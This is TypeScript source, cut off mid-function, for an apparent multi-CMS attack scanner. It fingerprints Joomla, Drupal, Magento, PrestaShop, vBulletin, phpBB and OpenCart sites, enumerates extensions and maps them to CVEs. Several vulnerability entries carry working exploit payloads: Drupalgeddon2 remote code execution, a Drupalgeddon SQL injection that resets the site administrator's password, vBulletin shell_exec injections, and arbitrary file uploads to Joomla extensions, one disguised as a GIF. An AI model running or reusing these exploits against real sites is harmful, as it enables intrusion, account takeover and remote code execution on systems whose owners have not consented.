// ═══════════════════════════════════════════════════════════════
//  MULTI-CMS VULNERABILITY SCANNER
//  Detects Joomla, Drupal, Magento, PrestaShop, vBulletin, phpBB,
//  OpenCart — enumerates extensions, matches CVEs, and executes
//  exploits for file upload / RCE vectors.
// ═══════════════════════════════════════════════════════════════

// ─── Types ───

export type CmsType = "joomla" | "drupal" | "magento" | "prestashop" | "vbulletin" | "phpbb" | "opencart" | "unknown";

export interface CmsExtension {
  slug: string;
  version: string | null;
  type: "component" | "module" | "plugin" | "template" | "theme" | "extension";
  detectedVia: string;
}

export interface CmsVulnerability {
  cms: CmsType;
  component: string; // "core" or extension slug
  cve: string | null;
  title: string;
  type: "file_upload" | "rce" | "sqli" | "auth_bypass" | "lfi" | "xss" | "ssrf" | "arbitrary_file_read" | "deserialization" | "object_injection" | "info_disclosure" | "privilege_escalation";
  severity: "critical" | "high" | "medium" | "low";
  affectedVersions: string;
  exploitAvailable: boolean;
  exploitEndpoint: string | null;
  exploitMethod: string | null;
  reference: string | null;
}

export interface CmsScanResult {
  cmsDetected: CmsType;
  cmsVersion: string | null;
  extensions: CmsExtension[];
  vulnerabilities: CmsVulnerability[];
  users: string[];
  interestingFindings: string[];
  scanDuration: number;
}

// ─── Known CMS Vulnerability Database ───

interface CmsVulnEntry {
  cms: CmsType;
  component: string;
  cve: string | null;
  title: string;
  type: CmsVulnerability["type"];
  severity: CmsVulnerability["severity"];
  affectedVersions: string;
  /** Detection: if this path returns 200 or matches, the component exists */
  detectionPath: string;
  detectionMatch?: string; // regex pattern to match in response body
  /** Exploit endpoint (relative to site root) */
  exploitEndpoint: string | null;
  exploitMethod: "POST" | "GET" | "PUT" | null;
  /** Build exploit payload */
  buildPayload?: (targetUrl: string, fileName: string, fileContent: string) => { body: BodyInit; headers: Record<string, string> };
  /** Verify success from response */
  successIndicator?: (status: number, body: string) => boolean;
  /** Where the uploaded file ends up */
  uploadedPath?: (fileName: string) => string;
  reference: string | null;
}

// ═══════════════════════════════════════════════════════════════
//  JOOMLA VULNERABILITY DATABASE
// ═══════════════════════════════════════════════════════════════

const JOOMLA_VULNS: CmsVulnEntry[] = [
  // ─── Core Vulnerabilities ───
  {
    cms: "joomla",
    component: "core",
    cve: "CVE-2023-23752",
    title: "Joomla! 4.0.0-4.2.7 Unauthenticated Information Disclosure (REST API)",
    type: "info_disclosure",
    severity: "high",
    affectedVersions: "4.0.0 - 4.2.7",
    detectionPath: "/api/index.php/v1/config/application?public=true",
    detectionMatch: "dbtype|password|secret",
    exploitEndpoint: "/api/index.php/v1/config/application?public=true",
    exploitMethod: "GET",
    successIndicator: (status, body) => status === 200 && (body.includes("dbtype") || body.includes("password")),
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2023-23752",
  },
  {
    cms: "joomla",
    component: "core",
    cve: "CVE-2023-23752",
    title: "Joomla! 4.0.0-4.2.7 User List Disclosure (REST API)",
    type: "info_disclosure",
    severity: "medium",
    affectedVersions: "4.0.0 - 4.2.7",
    detectionPath: "/api/index.php/v1/users?public=true",
    detectionMatch: "username|email",
    exploitEndpoint: "/api/index.php/v1/users?public=true",
    exploitMethod: "GET",
    successIndicator: (status, body) => status === 200 && (body.includes("username") || body.includes("email")),
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2023-23752",
  },
  {
    cms: "joomla",
    component: "core",
    cve: "CVE-2017-8917",
    title: "Joomla! 3.7.0 SQL Injection (com_fields)",
    type: "sqli",
    severity: "critical",
    affectedVersions: "3.7.0",
    detectionPath: "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,version()),1)",
    detectionMatch: "XPATH syntax error",
    exploitEndpoint: "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,version()),1)",
    exploitMethod: "GET",
    successIndicator: (status, body) => body.includes("XPATH syntax error") || body.includes("1105"),
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2017-8917",
  },
  {
    cms: "joomla",
    component: "core",
    cve: "CVE-2015-8562",
    title: "Joomla! 1.5.0-3.4.5 Object Injection RCE",
    type: "rce",
    severity: "critical",
    affectedVersions: "1.5.0 - 3.4.5",
    detectionPath: "/",
    exploitEndpoint: "/",
    exploitMethod: "GET",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2015-8562",
  },
  {
    cms: "joomla",
    component: "core",
    cve: "CVE-2016-8869",
    title: "Joomla! 3.4.4-3.6.3 Account Registration Bypass",
    type: "auth_bypass",
    severity: "critical",
    affectedVersions: "3.4.4 - 3.6.3",
    detectionPath: "/index.php?option=com_users&view=registration",
    detectionMatch: "registration|jform",
    exploitEndpoint: "/index.php?option=com_users&task=user.register",
    exploitMethod: "POST",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2016-8869",
  },
  {
    cms: "joomla",
    component: "core",
    cve: "CVE-2024-21726",
    title: "Joomla! 5.0.0-5.0.2 / 4.0.0-4.4.2 XSS via Core Filter",
    type: "xss",
    severity: "medium",
    affectedVersions: "4.0.0 - 5.0.2",
    detectionPath: "/administrator/index.php",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2024-21726",
  },

  // ─── Extension Vulnerabilities ───
  {
    cms: "joomla",
    component: "com_jce",
    cve: "CVE-2013-7313",
    title: "JCE Editor File Upload RCE",
    type: "file_upload",
    severity: "critical",
    affectedVersions: "<= 2.3.2.3",
    detectionPath: "/components/com_jce/jce.php",
    exploitEndpoint: "/index.php?option=com_jce&task=plugin.display&plugin=imgmanager",
    exploitMethod: "POST",
    buildPayload: (_targetUrl, fileName, fileContent) => {
      const boundary = "----WebKitFormBoundary" + Math.random().toString(36).slice(2);
      const body = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${fileName}"\r\nContent-Type: image/gif\r\n\r\nGIF89a\n${fileContent}\r\n--${boundary}--`;
      return { body, headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` } };
    },
    successIndicator: (status, body) => status === 200 && (body.includes("result") || body.includes("uploaded")),
    uploadedPath: (fn) => `/images/${fn}`,
    reference: "https://www.rapid7.com/db/modules/exploit/unix/webapp/joomla_comjce_imgmanager/",
  },
  {
    cms: "joomla",
    component: "com_akeeba",
    cve: "CVE-2014-7228",
    title: "Akeeba Kickstart Unserialize RCE",
    type: "rce",
    severity: "critical",
    affectedVersions: "<= 3.9.0",
    detectionPath: "/administrator/components/com_akeeba/restore.php",
    exploitEndpoint: "/administrator/components/com_akeeba/restore.php",
    exploitMethod: "POST",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2014-7228",
  },
  {
    cms: "joomla",
    component: "com_fabrik",
    cve: null,
    title: "Fabrik 3.9.11 Directory Traversal / File Upload",
    type: "file_upload",
    severity: "high",
    affectedVersions: "<= 3.9.11",
    detectionPath: "/components/com_fabrik/fabrik.php",
    exploitEndpoint: "/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload",
    exploitMethod: "POST",
    buildPayload: (_targetUrl, fileName, fileContent) => {
      const boundary = "----WebKitFormBoundary" + Math.random().toString(36).slice(2);
      const body = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${fileName}"\r\nContent-Type: application/octet-stream\r\n\r\n${fileContent}\r\n--${boundary}--`;
      return { body, headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` } };
    },
    successIndicator: (status) => status === 200,
    reference: "https://www.exploit-db.com/exploits/48263",
  },
  {
    cms: "joomla",
    component: "com_jdownloads",
    cve: null,
    title: "JDownloads Arbitrary File Upload",
    type: "file_upload",
    severity: "high",
    affectedVersions: "<= 3.2.63",
    detectionPath: "/components/com_jdownloads/jdownloads.php",
    exploitEndpoint: "/index.php?option=com_jdownloads&task=upload.upload",
    exploitMethod: "POST",
    reference: null,
  },
  {
    cms: "joomla",
    component: "com_media",
    cve: "CVE-2013-5576",
    title: "Joomla! Media Manager File Upload Bypass",
    type: "file_upload",
    severity: "high",
    affectedVersions: "2.5.x - 3.1.4",
    detectionPath: "/administrator/index.php?option=com_media",
    exploitEndpoint: "/index.php?option=com_media&task=file.upload",
    exploitMethod: "POST",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2013-5576",
  },
  {
    cms: "joomla",
    component: "com_jboss",
    cve: null,
    title: "JBoss Deployer File Upload",
    type: "file_upload",
    severity: "critical",
    affectedVersions: "all",
    detectionPath: "/components/com_jboss/jboss.php",
    exploitEndpoint: "/index.php?option=com_jboss&task=upload",
    exploitMethod: "POST",
    reference: null,
  },
  {
    cms: "joomla",
    component: "com_k2",
    cve: null,
    title: "K2 Component File Upload",
    type: "file_upload",
    severity: "high",
    affectedVersions: "<= 2.6.9",
    detectionPath: "/components/com_k2/k2.php",
    exploitEndpoint: "/index.php?option=com_k2&view=item&task=upload",
    exploitMethod: "POST",
    reference: null,
  },
  {
    cms: "joomla",
    component: "com_foxcontact",
    cve: null,
    title: "Fox Contact Form File Upload Bypass",
    type: "file_upload",
    severity: "high",
    affectedVersions: "<= 3.0",
    detectionPath: "/components/com_foxcontact/foxcontact.php",
    exploitEndpoint: "/index.php?option=com_foxcontact&task=upload",
    exploitMethod: "POST",
    reference: null,
  },
];

// ═══════════════════════════════════════════════════════════════
//  DRUPAL VULNERABILITY DATABASE
// ═══════════════════════════════════════════════════════════════

const DRUPAL_VULNS: CmsVulnEntry[] = [
  // ─── Core Vulnerabilities ───
  {
    cms: "drupal",
    component: "core",
    cve: "CVE-2018-7600",
    title: "Drupalgeddon2 — Drupal 7.x/8.x Unauthenticated RCE",
    type: "rce",
    severity: "critical",
    affectedVersions: "< 7.58, 8.x < 8.3.9, 8.4.x < 8.4.6, 8.5.x < 8.5.1",
    detectionPath: "/user/register",
    detectionMatch: "form_build_id",
    exploitEndpoint: "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
    exploitMethod: "POST",
    buildPayload: (_targetUrl, _fileName, fileContent) => {
      const formData = new URLSearchParams();
      formData.set("form_id", "user_register_form");
      formData.set("_drupal_ajax", "1");
      formData.set("mail[#post_render][]", "exec");
      formData.set("mail[#type]", "markup");
      formData.set("mail[#markup]", fileContent);
      return { body: formData.toString(), headers: { "Content-Type": "application/x-www-form-urlencoded" } };
    },
    successIndicator: (status, body) => status === 200 && body.includes("command"),
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2018-7600",
  },
  {
    cms: "drupal",
    component: "core",
    cve: "CVE-2018-7602",
    title: "Drupalgeddon3 — Drupal 7.x/8.x Authenticated RCE",
    type: "rce",
    severity: "critical",
    affectedVersions: "< 7.59, 8.x < 8.5.3",
    detectionPath: "/user/login",
    exploitEndpoint: "/user/1/cancel",
    exploitMethod: "POST",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2018-7602",
  },
  {
    cms: "drupal",
    component: "core",
    cve: "CVE-2019-6340",
    title: "Drupal 8.5.x-8.6.x REST Module RCE",
    type: "rce",
    severity: "critical",
    affectedVersions: "8.5.x < 8.5.11, 8.6.x < 8.6.10",
    detectionPath: "/node/1?_format=hal_json",
    detectionMatch: "_links|hal_json",
    exploitEndpoint: "/node/1?_format=hal_json",
    exploitMethod: "GET",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2019-6340",
  },
  {
    cms: "drupal",
    component: "core",
    cve: "CVE-2014-3704",
    title: "Drupalgeddon — Drupal 7.x SQL Injection",
    type: "sqli",
    severity: "critical",
    affectedVersions: "< 7.32",
    detectionPath: "/",
    detectionMatch: "Drupal",
    exploitEndpoint: "/?q=node&destination=node",
    exploitMethod: "POST",
    buildPayload: () => {
      const body = "name[0%20;update+users+set+name%3D'admin'+,+pass+%3D+'$S$CTo9G7Lx2rJENglhirA8oi7v9LtLYWFrGm.F.0Haw7eSfSzpzCl'+where+uid+%3D+'1';;#%20%20]=test&name[0]=test&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
      return { body, headers: { "Content-Type": "application/x-www-form-urlencoded" } };
    },
    successIndicator: (status) => status === 200 || status === 302,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2014-3704",
  },
  {
    cms: "drupal",
    component: "core",
    cve: "CVE-2020-13671",
    title: "Drupal 7/8/9 Unrestricted File Upload (.htaccess bypass)",
    type: "file_upload",
    severity: "critical",
    affectedVersions: "< 7.74, 8.x < 8.9.9, 9.x < 9.0.8",
    detectionPath: "/user/login",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2020-13671",
  },
  {
    cms: "drupal",
    component: "core",
    cve: "CVE-2022-25277",
    title: "Drupal Core .htaccess File Upload RCE",
    type: "rce",
    severity: "critical",
    affectedVersions: "9.3.x < 9.3.19, 9.4.x < 9.4.3",
    detectionPath: "/user/login",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2022-25277",
  },
  {
    cms: "drupal",
    component: "core",
    cve: "CVE-2020-28949",
    title: "Drupal PEAR Archive_Tar Arbitrary PHP Code Execution",
    type: "rce",
    severity: "critical",
    affectedVersions: "7.x < 7.78, 8.x < 8.9.11, 9.x < 9.0.9, 9.1.x < 9.1.3",
    detectionPath: "/",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: "https://www.drupal.org/sa-core-2020-013",
  },

  // ─── Module Vulnerabilities ───
  {
    cms: "drupal",
    component: "ctools",
    cve: "CVE-2016-3163",
    title: "Chaos Tool Suite (ctools) Object Injection",
    type: "object_injection",
    severity: "high",
    affectedVersions: "< 7.x-1.10",
    detectionPath: "/sites/all/modules/ctools/ctools.info",
    detectionMatch: "name = Chaos tools",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2016-3163",
  },
  {
    cms: "drupal",
    component: "services",
    cve: "CVE-2014-3704",
    title: "Services Module SQL Injection",
    type: "sqli",
    severity: "critical",
    affectedVersions: "< 7.x-3.10",
    detectionPath: "/sites/all/modules/services/services.info",
    detectionMatch: "name = Services",
    exploitEndpoint: "/services/rest",
    exploitMethod: "POST",
    reference: null,
  },
  {
    cms: "drupal",
    component: "restws",
    cve: "CVE-2016-7103",
    title: "RESTful Web Services RCE",
    type: "rce",
    severity: "critical",
    affectedVersions: "< 7.x-2.6",
    detectionPath: "/sites/all/modules/restws/restws.info",
    detectionMatch: "name = RESTful Web Services",
    exploitEndpoint: "/",
    exploitMethod: "GET",
    reference: null,
  },
  {
    cms: "drupal",
    component: "mailchimp",
    cve: null,
    title: "Mailchimp Module PHP Object Injection",
    type: "object_injection",
    severity: "high",
    affectedVersions: "< 7.x-4.7",
    detectionPath: "/sites/all/modules/mailchimp/mailchimp.info",
    detectionMatch: "name = Mailchimp",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: null,
  },
];

// ═══════════════════════════════════════════════════════════════
//  MAGENTO VULNERABILITY DATABASE
// ═══════════════════════════════════════════════════════════════

const MAGENTO_VULNS: CmsVulnEntry[] = [
  {
    cms: "magento",
    component: "core",
    cve: "CVE-2022-24086",
    title: "Magento 2 Template Injection RCE (CVSS 9.8)",
    type: "rce",
    severity: "critical",
    affectedVersions: "2.3.3-p1 - 2.3.7-p2, 2.4.0 - 2.4.3-p1",
    detectionPath: "/magento_version",
    detectionMatch: "Magento",
    exploitEndpoint: "/checkout",
    exploitMethod: "POST",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2022-24086",
  },
  {
    cms: "magento",
    component: "core",
    cve: "CVE-2024-20720",
    title: "Magento 2 XML Injection RCE (CosmicSting)",
    type: "rce",
    severity: "critical",
    affectedVersions: "< 2.4.7",
    detectionPath: "/magento_version",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2024-20720",
  },
  {
    cms: "magento",
    component: "core",
    cve: "CVE-2019-7932",
    title: "Magento 2 Arbitrary File Upload via Admin Panel",
    type: "file_upload",
    severity: "critical",
    affectedVersions: "< 2.3.1",
    detectionPath: "/admin",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2019-7932",
  },
  {
    cms: "magento",
    component: "core",
    cve: "CVE-2019-8144",
    title: "Magento 2 Unauthenticated RCE via GraphQL",
    type: "rce",
    severity: "critical",
    affectedVersions: "2.3.x < 2.3.2-p2",
    detectionPath: "/graphql",
    detectionMatch: "graphql",
    exploitEndpoint: "/graphql",
    exploitMethod: "POST",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2019-8144",
  },
  {
    cms: "magento",
    component: "core",
    cve: "CVE-2015-1397",
    title: "Magento Shoplift SQL Injection (CVSS 7.5)",
    type: "sqli",
    severity: "high",
    affectedVersions: "< 1.9.1.1",
    detectionPath: "/",
    exploitEndpoint: "/admin/Cms_Wysiwyg/directive/index/",
    exploitMethod: "POST",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2015-1397",
  },
];

// ═══════════════════════════════════════════════════════════════
//  PRESTASHOP VULNERABILITY DATABASE
// ═══════════════════════════════════════════════════════════════

const PRESTASHOP_VULNS: CmsVulnEntry[] = [
  {
    cms: "prestashop",
    component: "core",
    cve: "CVE-2022-31181",
    title: "PrestaShop SQL Injection via Smarty Cache (CVSS 9.8)",
    type: "sqli",
    severity: "critical",
    affectedVersions: "< 1.7.8.7",
    detectionPath: "/",
    detectionMatch: "PrestaShop",
    exploitEndpoint: "/",
    exploitMethod: "POST",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2022-31181",
  },
  {
    cms: "prestashop",
    component: "core",
    cve: "CVE-2023-30839",
    title: "PrestaShop SQL Injection (Backend)",
    type: "sqli",
    severity: "critical",
    affectedVersions: "< 8.0.4, < 1.7.8.9",
    detectionPath: "/",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2023-30839",
  },
  {
    cms: "prestashop",
    component: "core",
    cve: "CVE-2023-39526",
    title: "PrestaShop Arbitrary File Write via SQL Injection",
    type: "file_upload",
    severity: "critical",
    affectedVersions: "< 8.1.1, < 1.7.8.10",
    detectionPath: "/",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2023-39526",
  },
];

// ═══════════════════════════════════════════════════════════════
//  VBULLETIN VULNERABILITY DATABASE
// ═══════════════════════════════════════════════════════════════

const VBULLETIN_VULNS: CmsVulnEntry[] = [
  {
    cms: "vbulletin",
    component: "core",
    cve: "CVE-2019-16759",
    title: "vBulletin 5.x Pre-Auth RCE (widgetConfig)",
    type: "rce",
    severity: "critical",
    affectedVersions: "5.0.0 - 5.5.4",
    detectionPath: "/",
    detectionMatch: "vBulletin",
    exploitEndpoint: "/ajax/render/widget_php",
    exploitMethod: "POST",
    buildPayload: (_targetUrl, _fileName, fileContent) => {
      const body = `widgetConfig[code]=${encodeURIComponent(`echo shell_exec('${fileContent}');exit;`)}`;
      return { body, headers: { "Content-Type": "application/x-www-form-urlencoded" } };
    },
    successIndicator: (status, body) => status === 200 && body.length > 0 && !body.includes("invalid_"),
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2019-16759",
  },
  {
    cms: "vbulletin",
    component: "core",
    cve: "CVE-2020-17496",
    title: "vBulletin 5.x Pre-Auth RCE (subWidgets)",
    type: "rce",
    severity: "critical",
    affectedVersions: "5.5.4 - 5.6.2",
    detectionPath: "/",
    detectionMatch: "vBulletin",
    exploitEndpoint: "/ajax/render/widget_tabbedcontainer_tab_panel",
    exploitMethod: "POST",
    buildPayload: (_targetUrl, _fileName, fileContent) => {
      const body = `subWidgets[0][template]=widget_php&subWidgets[0][config][code]=${encodeURIComponent(`echo shell_exec('${fileContent}');exit;`)}`;
      return { body, headers: { "Content-Type": "application/x-www-form-urlencoded" } };
    },
    successIndicator: (status, body) => status === 200 && body.length > 0,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2020-17496",
  },
  {
    cms: "vbulletin",
    component: "core",
    cve: "CVE-2020-12720",
    title: "vBulletin 5.x Pre-Auth SQL Injection",
    type: "sqli",
    severity: "critical",
    affectedVersions: "< 5.6.1 Patch Level 1",
    detectionPath: "/",
    exploitEndpoint: "/ajax/api/content_infraction/getIndexableContent",
    exploitMethod: "POST",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2020-12720",
  },
];

// ═══════════════════════════════════════════════════════════════
//  PHPBB VULNERABILITY DATABASE
// ═══════════════════════════════════════════════════════════════

const PHPBB_VULNS: CmsVulnEntry[] = [
  {
    cms: "phpbb",
    component: "core",
    cve: "CVE-2021-32735",
    title: "phpBB Phar Deserialization RCE",
    type: "deserialization",
    severity: "critical",
    affectedVersions: "< 3.3.5",
    detectionPath: "/",
    detectionMatch: "phpBB",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2021-32735",
  },
  {
    cms: "phpbb",
    component: "core",
    cve: "CVE-2018-19274",
    title: "phpBB Phar Deserialization via File Upload",
    type: "file_upload",
    severity: "critical",
    affectedVersions: "< 3.2.4",
    detectionPath: "/",
    detectionMatch: "phpBB",
    exploitEndpoint: "/posting.php",
    exploitMethod: "POST",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2018-19274",
  },
];

// ═══════════════════════════════════════════════════════════════
//  OPENCART VULNERABILITY DATABASE
// ═══════════════════════════════════════════════════════════════

const OPENCART_VULNS: CmsVulnEntry[] = [
  {
    cms: "opencart",
    component: "core",
    cve: "CVE-2023-47444",
    title: "OpenCart 4.x Arbitrary File Upload",
    type: "file_upload",
    severity: "critical",
    affectedVersions: "4.0.0.0 - 4.0.2.3",
    detectionPath: "/",
    detectionMatch: "OpenCart|opencart",
    exploitEndpoint: "/admin/index.php?route=marketplace/installer.upload",
    exploitMethod: "POST",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2023-47444",
  },
  {
    cms: "opencart",
    component: "core",
    cve: "CVE-2024-21514",
    title: "OpenCart SQL Injection via Admin Route",
    type: "sqli",
    severity: "high",
    affectedVersions: "< 4.0.2.3",
    detectionPath: "/",
    exploitEndpoint: null,
    exploitMethod: null,
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2024-21514",
  },
];

// ═══════════════════════════════════════════════════════════════
//  ALL CMS VULNS COMBINED
// ═══════════════════════════════════════════════════════════════

const ALL_CMS_VULNS: CmsVulnEntry[] = [
  ...JOOMLA_VULNS,
  ...DRUPAL_VULNS,
  ...MAGENTO_VULNS,
  ...PRESTASHOP_VULNS,
  ...VBULLETIN_VULNS,
  ...PHPBB_VULNS,
  ...OPENCART_VULNS,
];

// ─── Joomla Extensions to Enumerate ───
const JOOMLA_EXTENSIONS = [
  "com_jce", "com_akeeba", "com_fabrik", "com_k2", "com_jdownloads",
  "com_media", "com_foxcontact", "com_virtuemart", "com_hikashop",
  "com_kunena", "com_easyblog", "com_jboss", "com_joomgallery",
  "com_jevents", "com_phocagallery", "com_phocadownload",
  "com_rsform", "com_chronoforms", "com_breezingforms",
  "com_acymailing", "com_jnews", "com_docman", "com_edocman",
  "com_joomlapack", "com_extplorer", "com_eXtplorer",
  "com_jwallpapers", "com_joomlaupdate", "com_installer",
  "com_contentsubmit", "com_user", "com_weblinks",
  "com_jcalpro", "com_joomlaquiz", "com_dtregister",
  "com_civicrm", "com_joomfish", "com_sh404sef",
  "com_redshop", "com_mijoshop", "com_j2store",
];

// ─── Drupal Modules to Enumerate ───
const DRUPAL_MODULES = [
  "ctools", "views", "token", "pathauto", "entity",
  "libraries", "admin_menu", "webform", "date", "imce",
  "link", "module_filter", "backup_migrate", "rules",
  "field_group", "metatag", "media", "devel",
  "services", "restws", "mailchimp", "commerce",
  "panels", "features", "context", "entityreference",
  "colorbox", "wysiwyg", "ckeditor", "jquery_update",
  "xmlsitemap", "redirect", "globalredirect",
  "file_entity", "media_youtube", "video_embed_field",
  "captcha", "recaptcha", "honeypot",
  "search_api", "search_api_solr", "facetapi",
];

// ─── Direct Fetch Helper ───

async function directFetch(url: string, init: RequestInit = {}, timeout = 8000): Promise<Response> {
  const controller = new AbortController();
  const t = setTimeout(() => controller.abort(), timeout);
  try {
    return await fetch(url, { ...init, signal: controller.signal, redirect: "follow" });
  } finally {
    clearTimeout(t);
  }
}

// ═══════════════════════════════════════════════════════════════
//  CMS DETECTION
// ═══════════════════════════════════════════════════════════════

export async function detectCms(targetUrl: string): Promise<{ cms: CmsType; version: string | null; confidence: number }> {
  const cleanUrl = targetUrl.replace(/\/+$/, "");
  let cms: CmsType = "unknown";
  let version: string | null = null;
  let confidence = 0;

  try {
    // Fetch homepage for fingerprinting
    const resp = await directFetch(cleanUrl, {
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
    }, 10000);
    const html = await resp.text();
    const headers = resp.headers;

    // ─── Joomla Detection ───
    if (html.includes("/media/jui/") || html.includes("Joomla!") || html.includes("/templates/") && html.includes("com_content")) {
      cms = "joomla";
      confidence = 70;
      // Version from meta generator
      const jVer = html.match(/content="Joomla!\s*([\d.]+)"/i);
      if (jVer) { version = jVer[1]; confidence = 95; }
    }

    // Check Joomla manifest
    if (cms === "unknown" || cms === "joomla") {
      try {
        const mResp = await directFetch(`${cleanUrl}/administrator/manifests/files/joomla.xml`, {}, 5000);
        if (mResp.status === 200) {
          const mText = await mResp.text();
          if (mText.includes("<extension")) {
            cms = "joomla";
            confidence = 95;
            const vMatch = mText.match(/<version>([\d.]+)<\/version>/);
            if (vMatch) version = vMatch[1];
          }
        }
      } catch { /* not joomla */ }
    }

    // ─── Drupal Detection ───
    if (cms === "unknown") {
      const xGen = headers.get("x-generator") || "";
      const xDrupalCache = headers.get("x-drupal-cache") || "";
      if (xGen.includes("Drupal") || xDrupalCache || html.includes("Drupal.settings") || html.includes("/sites/default/files/") || html.includes("drupal.js")) {
        cms = "drupal";
        confidence = 85;
        const dVer = xGen.match(/Drupal\s+([\d.]+)/);
        if (dVer) { version = dVer[1]; confidence = 95; }
      }
    }

    // Check Drupal CHANGELOG.txt
    if (cms === "unknown" || cms === "drupal") {
      try {
        const cResp = await directFetch(`${cleanUrl}/CHANGELOG.txt`, {}, 5000);
        if (cResp.status === 200) {
          const cText = await cResp.text();
          if (cText.includes("Drupal")) {
            cms = "drupal";
            confidence = 95;
            const vMatch = cText.match(/Drupal\s+([\d.]+)/);
            if (vMatch) version = vMatch[1];
          }
        }
      } catch { /* not drupal */ }
    }

    // ─── Magento Detection ───
    if (cms === "unknown") {
      if (html.includes("Mage.Cookies") || html.includes("magento") || html.includes("/skin/frontend/") || html.includes("Magento_")) {
        cms = "magento";
        confidence = 80;
      }
    }

    if (cms === "unknown") {
      try {
        const mResp = await directFetch(`${cleanUrl}/magento_version`, {}, 5000);
        if (mResp.status === 200) {
          const mText = await mResp.text();
          if (mText.includes("Magento")) {
            cms = "magento";
            confidence = 95;
            const vMatch = mText.match(/Magento\/([\d.]+)/);
            if (vMatch) version = vMatch[1];
          }
        }
      } catch { /* not magento */ }
    }

    // ─── PrestaShop Detection ───
    if (cms === "unknown") {
      if (html.includes("PrestaShop") || html.includes("prestashop") || html.includes("/themes/classic/") || html.includes("prestashop.js")) {
        cms = "prestashop";
        confidence = 80;
        const pVer = html.match(/PrestaShop\s*([\d.]+)/i);
        if (pVer) { version = pVer[1]; confidence = 90; }
      }
    }

    // ─── vBulletin Detection ───
    if (cms === "unknown") {
      if (html.includes("vBulletin") || html.includes("vbulletin") || html.includes("vb_login") || html.includes("clientscript/vbulletin")) {
        cms = "vbulletin";
        confidence = 85;
        const vVer = html.match(/vBulletin.*?(\d+\.\d+\.\d+)/i);
        if (vVer) { version = vVer[1]; confidence = 95; }
      }
    }

    // ─── phpBB Detection ───
    if (cms === "unknown") {
      if (html.includes("phpBB") || html.includes("phpbb") || html.includes("Powered by phpBB") || html.includes("./styles/prosilver")) {
        cms = "phpbb";
        confidence = 85;
        const pVer = html.match(/phpBB.*?(\d+\.\d+\.\d+)/i);
        if (pVer) { version = pVer[1]; confidence = 95; }
      }
    }

    // ─── OpenCart Detection ───
    if (cms === "unknown") {
      if (html.includes("OpenCart") || html.includes("opencart") || html.includes("route=common/home") || html.includes("catalog/view/theme")) {
        cms = "opencart";
        confidence = 80;
        const oVer = html.match(/OpenCart\s*([\d.]+)/i);
        if (oVer) { version = oVer[1]; confidence = 90; }
      }
    }

  } catch { /* detection failed */ }

  return { cms, version, confidence };
}

// ═══════════════════════════════════════════════════════════════
//  JOOMLA EXTENSION ENUMERATION
// ═══════════════════════════════════════════════════════════════

async function enumerateJoomlaExtensions(targetUrl: string): Promise<CmsExtension[]> {
  const extensions: CmsExtension[] = [];
  const batchSize = 15;

  for (let i = 0; i < JOOMLA_EXTENSIONS.length; i += batchSize) {
    const batch = JOOMLA_EXTENSIONS.slice(i, i + batchSize);
    const results = await Promise.allSettled(
      batch.map(async (slug) => {
        // Check component directory
        const compUrl = `${targetUrl}/components/${slug}/`;
        try {
          const resp = await directFetch(compUrl, {
            headers: { "User-Agent": "Mozilla/5.0 (compatible; JoomlaScan/1.0)" },
          }, 5000);
          if (resp.status === 200 || resp.status === 403) {
            // Try to get version from manifest
            let version: string | null = null;
            try {
              const xmlResp = await directFetch(`${targetUrl}/administrator/components/${slug}/${slug.replace("com_", "")}.xml`, {}, 4000);
              if (xmlResp.status === 200) {
                const xmlText = await xmlResp.text();
                const vMatch = xmlText.match(/<version>([\d.]+)<\/version>/);
                if (vMatch) version = vMatch[1];
              }
            } catch { /* no manifest */ }

            return { slug, version, type: "component" as const, detectedVia: resp.status === 403 ? "directory_403" : "directory_200" };
          }
        } catch { /* not found */ }
        return null;
      }),
    );

    for (const r of results) {
      if (r.status === "fulfilled" && r.value) {
